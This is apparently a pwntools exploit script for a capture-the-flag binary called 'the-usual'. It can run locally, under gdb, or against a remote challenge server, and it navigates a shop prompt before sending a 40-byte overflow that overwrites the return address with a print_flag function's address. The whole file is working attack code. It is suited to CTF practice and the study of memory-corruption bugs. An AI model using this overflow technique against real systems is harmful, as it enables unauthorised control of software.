from pwn import *
from icecream import ic

elf = exe = ELF("./the-usual")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("35.94.129.106", 3008)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004012c7
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
print_flag = 0x0000000000401557
ru("to buy? (1-5)")
sl(b'3')
ru("How many would you like?")
# payload = b'33038210'
payload = b'a'
sl(payload)
ru("tand to say?")
payload = b'a'*40
payload += p64(print_flag)
# payload += b'99'
sl(payload)
i()
